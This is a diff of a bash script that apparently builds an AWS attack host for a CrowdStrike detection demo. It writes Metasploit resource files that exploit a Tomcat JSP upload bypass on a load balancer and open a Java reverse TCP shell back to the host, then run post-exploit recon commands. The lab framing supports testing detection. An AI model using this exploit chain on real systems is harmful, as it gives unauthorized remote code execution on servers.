@@ -4,7 +4,9 @@ LHOST=$(curl http://169.254.169.254/latest/meta-data/public-ipv4);
 PRIVATE_IPADDRESS=$(curl http://169.254.169.254/latest/meta-data/local-ipv4);
 TARGET_PORT='80';
 LPORT='443';
-
+AWS_REGION=$(curl --silent http://169.254.169.254/latest/dynamic/instance-identity/document | jq -r .region);
+TARGET_ADDRESS=$(aws elbv2 describe-load-balancers --query LoadBalancers[].DNSName --output text --region ${AWS_REGION})
+#TARGET_ADDRESS='1.1.1.1'
 startup ()
 {
 	#clear;
@@ -16,7 +18,7 @@ startup ()
 create_kali_macros ()
 {
 	# shellcheck disable=SC2024
-	sudo cat >/home/kali/configure.rc <<EOL
+	sudo cat >/home/admin/configure.rc <<EOL
 use exploit/multi/http/tomcat_jsp_upload_bypass
 set RHOSTS ${TARGET_ADDRESS}
 set LHOST ${LHOST}
@@ -26,31 +28,31 @@ EOL
 	
 
 	# shellcheck disable=SC2024
-	sudo cat >/home/kali/startup.rc <<EOL
+	sudo cat >/home/admin/startup.rc <<EOL
 use exploit/multi/http/tomcat_jsp_upload_bypass
 set rhosts ${TARGET_ADDRESS}
 set rport ${TARGET_PORT}
 set LHOST ${LHOST}
 set LPORT ${LPORT}
-set REVERSELISTNERBINDADDRESS ${PRIVATE_IPADDRESS}
+set REVERSELISTENERBINDADDRESS ${PRIVATE_IPADDRESS}
 set AutoRunScript post_exploit.rc
 set payload java/jsp_shell_reverse_tcp
 exploit -j
 EOL
 
 	# shellcheck disable=SC2024
-	sudo cat >/home/kali/post_exploit.rc <<'EOL'
+	sudo cat >/home/admin/post_exploit.rc <<'EOL'
 whoami
 netstat -ano
 bash crowdstrike_test_high
 EOL
-	sudo chown kali:kali /home/kali/*.rc
+	sudo chown admin:admin /home/admin/*.rc
 }
 
 setup_aliases ()
 {
 	# shellcheck disable=SC2024
-	sudo cat >>/home/kali/.zshrc <<'EOL'
+	sudo cat >>/home/admin/.bashrc <<'EOL'
 function check_tomcat() {
 	while true; do
 	  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_ADDRESS}:${TARGET_PORT}")
@@ -86,18 +88,5 @@ EOL
 
 
 
-for arg in "$@"
-do
-    if [[ "$arg" == *--target_address=* ]]
-    then
-        TARGET_ADDRESS=${arg/--target_address=/}
-    fi
-done
-
-if [ -z "${TARGET_ADDRESS}" ]
-then
-    read -r -p "ALB DNS Address: " TARGET_ADDRESS
-fi
-echo "${TARGET_ADDRESS}"
 
 startup;
